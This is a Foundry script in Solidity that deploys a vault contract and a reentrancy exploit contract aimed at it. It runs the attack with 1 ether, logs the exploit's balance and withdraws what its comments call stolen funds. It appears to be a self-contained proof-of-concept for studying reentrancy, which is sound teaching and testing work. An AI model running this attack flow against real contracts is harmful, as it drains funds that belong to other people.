// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import "../src/reentracy.sol";
import "../src/reentrancyExploit.sol";

contract DeployAndVerifyScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // Deploy AssetVault contract
        AssetVault assetVault = new AssetVault();

        // Deploy ReentrancyExploit contract with the address of AssetVault
        reentrancyExploit exploit = new reentrancyExploit(address(assetVault));

        // Execute the attack
        exploit.attack{value: 1 ether}();

        // Check the balance of the ReentrancyExploit contract
        uint256 balance = address(exploit).balance;
        console.log("ReentrancyExploit contract balance:", balance);

        // Withdraw stolen funds
        exploit.withdraw();

        vm.stopBroadcast();
    }
}
